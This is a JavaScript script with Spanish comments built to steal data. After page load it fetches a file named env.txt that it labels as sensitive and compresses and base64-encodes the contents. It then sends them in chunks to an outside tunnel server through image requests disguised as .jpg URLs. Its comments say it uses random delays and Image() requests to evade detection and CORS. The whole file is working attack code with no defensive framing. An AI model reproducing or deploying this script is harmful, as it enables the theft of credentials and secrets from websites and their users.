// Configuración
const CONFIG = {
	targetUri: "./env.txt",  // URI objetivo con datos sensibles
	exfilServer: "https://t-itpweb5y.tunn.dev",         // Servidor de exfiltración
	exfilPath: "/exfil",                     // Ruta de exfiltración
	chunkSize: 2000,                         // Tamaño de cada fragmento
	sessionId: generateSessionId(),          // ID único para esta sesión
	delayMin: 50,                            // Retardo mínimo entre solicitudes (ms)
	delayMax: 200,                           // Retardo máximo entre solicitudes (ms)
	maxRetries: 3                            // Número máximo de reintentos
};

// Genera un ID de sesión único
function generateSessionId() {
	return Math.random().toString(36).substring(2, 10) + 
		   Date.now().toString(36);
}

// Comprime datos usando algoritmo LZW simple
function compress(data) {
	const dict = {};
	const result = [];
	let phrase = "";
	let code = 256;
	
	// Inicializa el diccionario con códigos ASCII
	for (let i = 0; i < 256; i++) {
		dict[String.fromCharCode(i)] = i;
	}
	
	for (const char of data) {
		const newPhrase = phrase + char;
		if (dict[newPhrase] !== undefined) {
			phrase = newPhrase;
		} else {
			result.push(dict[phrase]);
			dict[newPhrase] = code++;
			phrase = char;
		}
	}
	
	if (phrase !== "") {
		result.push(dict[phrase]);
	}
	
	// Convierte el array de códigos a string para poder codificarlo en base64
	return result.map(code => String.fromCharCode(code)).join('');
}

// Retardo aleatorio para evadir detección
function randomDelay() {
	const delay = Math.floor(Math.random() * (CONFIG.delayMax - CONFIG.delayMin + 1)) + CONFIG.delayMin;
	return new Promise(resolve => setTimeout(resolve, delay));
}

// Envía un fragmento de datos al servidor
async function sendChunk(chunkIndex, chunkData, isLast = false) {
	const marker = isLast ? "LAST" : chunkIndex.toString();
	const url = `${CONFIG.exfilServer}${CONFIG.exfilPath}/${marker}/${CONFIG.sessionId}/${chunkData}.jpg`;
	
	let retries = 0;
	while (retries < CONFIG.maxRetries) {
		try {
			// Usamos Image() en lugar de fetch para evadir CORS
			return new Promise((resolve, reject) => {
				const img = new Image();
				img.onload = resolve;
				img.onerror = () => {
					// El error 404 es esperado, consideramos esto como éxito
					resolve();
				};
				img.src = url;
			});
		} catch (e) {
			retries++;
			await randomDelay();
		}
	}
}

// Función principal para exfiltrar datos
async function stealData() {
	try {
		console.log(`[+] Iniciando exfiltración con sesión: ${CONFIG.sessionId}`);
		
		// Obtener los datos sensibles usando Fetch API
		const response = await fetch(CONFIG.targetUri);
		const dataResponse = await response.text();
		console.log(`[+] Datos obtenidos: ${dataResponse.length} bytes`);
		
		// Comprimir y codificar los datos
		const compressedData = compress(dataResponse);
		const exfilData = btoa(compressedData);
		console.log(`[+] Datos comprimidos y codificados: ${exfilData.length} bytes`);
		
		// Calcular número de fragmentos
		const numFullChunks = Math.floor(exfilData.length / CONFIG.chunkSize);
		const remainderBits = exfilData.length % CONFIG.chunkSize;
		
		console.log(`[+] Enviando ${numFullChunks + 1} fragmentos...`);
		
		// Enviar fragmentos completos
		for (let i = 0; i < numFullChunks; i++) {
			const exfilChunk = exfilData.slice(CONFIG.chunkSize * i, CONFIG.chunkSize * (i + 1));
			await sendChunk(i, exfilChunk);
			await randomDelay();
			console.log(`[+] Enviado fragmento ${i+1}/${numFullChunks+1}`);
		}
		
		// Enviar el último fragmento (posiblemente incompleto)
		const lastChunk = exfilData.slice(CONFIG.chunkSize * numFullChunks);
		await sendChunk(numFullChunks, lastChunk, true);
		console.log(`[+] Enviado fragmento final ${numFullChunks+1}/${numFullChunks+1}`);
		
		console.log(`[+] Exfiltración completada con éxito`);
		
		// Enviar resumen como verificación
		const metadataChunk = JSON.stringify({
			sessionId: CONFIG.sessionId,
			totalChunks: numFullChunks + 1,
			totalBytes: exfilData.length,
			timestamp: Date.now(),
			source: CONFIG.targetUri
		});
		
		await sendChunk("META", btoa(metadataChunk));
		
	} catch (error) {
		console.error(`[-] Error en exfiltración: ${error.message}`);
	}
}

// Iniciar el proceso de exfiltración con un pequeño retraso para asegurar que la página se cargue completamente
setTimeout(stealData, 500);
